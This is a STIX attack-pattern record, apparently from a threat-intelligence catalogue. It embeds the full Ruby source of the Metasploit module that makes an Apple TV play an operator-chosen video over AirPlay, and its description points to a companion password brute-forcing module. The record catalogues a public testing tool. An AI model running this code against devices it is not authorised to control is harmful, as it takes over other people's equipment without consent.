{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5b1167c8-58bf-4947-b6b9-0bff04af13e1",
    "created": "2024-08-14T16:24:15.19642Z",
    "modified": "2024-08-14T16:24:15.196424Z",
    "name": "Apple TV Video Remote Control",
    "description": "( This module plays a video on an AppleTV device. Note that AppleTV can be somewhat picky about the server that hosts the video. Tested servers include default IIS, default Apache, and Ruby's WEBrick. For WEBrick, the default MIME list may need to be updated, depending on what media file is to be played. Python SimpleHTTPServer is not",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/appletv/appletv_display_video.rb",
            "external_id": "appletv_display_video.rb"
        },
        {
            "source_name": "reference",
            "url": "http://nto.github.io/AirPlay.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'uri'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Apple TV Video Remote Control',\n      'Description'    => %q(\n        This module plays a video on an AppleTV device. Note that\n        AppleTV can be somewhat picky about the server that hosts the video.\n        Tested servers include default IIS, default Apache, and Ruby's WEBrick.\n        For WEBrick, the default MIME list may need to be updated, depending on\n        what media file is to be played. Python SimpleHTTPServer is not\n        recommended. Also, if you're playing a video, the URL must be an IP\n        address. Some AppleTV devices are actually password-protected; in that\n        case please set the PASSWORD datastore option. For password\n        brute forcing, please see the module auxiliary/scanner/http/appletv_login.\n      ),\n      'Author'         =>\n        [\n          '0a29406d9794e4f9b30b3c5d6702c708', # Original work\n          'sinn3r'                            # Make myself liable to mistakes since I made significant changes\n        ],\n      'References'     =>\n        [\n          ['URL', 'http://nto.github.io/AirPlay.html']\n        ],\n      'DefaultOptions' => { 'HttpUsername' => 'AirPlay' },\n      'License'        => MSF_LICENSE\n    ))\n\n    register_options([\n      Opt::RPORT(7000),\n      OptInt.new('TIME', [true, 'Time in seconds to show the video', 60]),\n      OptString.new('URL', [true, 'URL of video to show. Must use an IP address']),\n      OptString.new('HttpPassword', [false, 'The password for AppleTV AirPlay'])\n    ])\n\n    # We're not actually using any of these against AppleTV in our Rex HTTP client init,\n    # so deregister them so we don't overwhelm the user with fake options.\n    deregister_options(\n      'HTTP::uri_encode_mode', 'HTTP::uri_full_url', 'HTTP::pad_method_uri_count',\n      'HTTP::pad_uri_version_count', 'HTTP::pad_method_uri_type', 'HTTP::pad_uri_version_type',\n      'HTTP::method_random_valid', 'HTTP::method_random_invalid', 'HTTP::method_random_case',\n      'HTTP::uri_dir_self_reference', 'HTTP::uri_dir_fake_relative', 'HTTP::uri_use_backslashes',\n      'HTTP::pad_fake_headers', 'HTTP::pad_fake_headers_count', 'HTTP::pad_get_params',\n      'HTTP::pad_get_params_count', 'HTTP::pad_post_params', 'HTTP::pad_post_params_count',\n      'HTTP::uri_fake_end', 'HTTP::uri_fake_params_start', 'HTTP::header_folding',\n      'NTLM::UseNTLM2_session', 'NTLM::UseNTLMv2', 'NTLM::SendLM', 'NTLM::SendNTLM',\n      'NTLM::SendSPN', 'NTLM::UseLMKey', 'DOMAIN', 'DigestAuthIIS', 'VHOST'\n    )\n  end\n\n\n  #\n  # Sends a video request to AppleTV. HttpClient isn't used because we actually need to keep\n  # the connection alive so that the video can keep playing.\n  #\n  def send_video_request(opts)\n    http = nil\n\n    http = Rex::Proto::Http::Client.new(\n      rhost,\n      rport.to_i,\n      {\n        'Msf' => framework,\n        'MsfExploit' => self\n      },\n      ssl,\n      ssl_version,\n      proxies,\n      datastore['HttpUsername'],\n      datastore['HttpPassword']\n    )\n    add_socket(http)\n\n    http.set_config('agent' => datastore['UserAgent'])\n\n    req = http.request_raw(opts)\n    res = http.send_recv(req)\n    Rex.sleep(datastore['TIME']) if res.code == 200\n    http.close\n\n    res\n  end\n\n\n  #\n  # Checks the URI datastore option. AppleTV is sort of picky about the URI. It's better to\n  # always supply an IP instead of a domain.\n  #\n  def validate_source!(uri)\n    unless Rex::Socket.is_ipv4?(URI(uri).host) # Same trick in target_uri form HttpClient\n      raise Msf::OptionValidateError.new(['URL'])\n    end\n  end\n\n\n  #\n  # Plays a video as a new thread\n  #\n  def play_video_uri\n    uri = datastore['URL']\n    validate_source!(uri)\n\n    body  = \"Content-Location: #{uri}\\n\"\n    body << \"Start-Position: 0.0\\n\"\n\n    opts = {\n      'method'  => 'POST',\n      'uri'     => '/play',\n      'headers' => {\n        'Content-Length' => body.length.to_s,\n        'Content-Type'   => 'text/parameters'\n      },\n      'data'    => body\n    }\n\n    res = send_video_request(opts)\n\n    if !res\n      print_status(\"The connection timed out\")\n    elsif res.code == 200\n      print_status(\"Received HTTP 200\")\n    else\n      print_error(\"The request failed due to an unknown reason\")\n    end\n  end\n\n\n  #\n  # Maybe it's just me not understanding the /stop API correctly, but when I send a request to\n  # /stop, it doesn't actually do anything. It is sort of possible to stop my video by looking\n  # through framework.threads.each {|t| puts t[:tm_name]}, and then kill the right thread. But\n  # if there are multiple appletv_display_video running, we don't seem to have a good way to\n  # kill the right thread we want. We could kill them all, but we shouldn't do that. So I'll\n  # just leave this method here, and then we'll think about how to do it later.\n  #\n  def stop_play\n    raise NotImplementedError\n  end\n\n\n  def run\n    print_status(\"Video request sent. Duration set: #{datastore['TIME']} seconds\")\n    play_video_uri\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}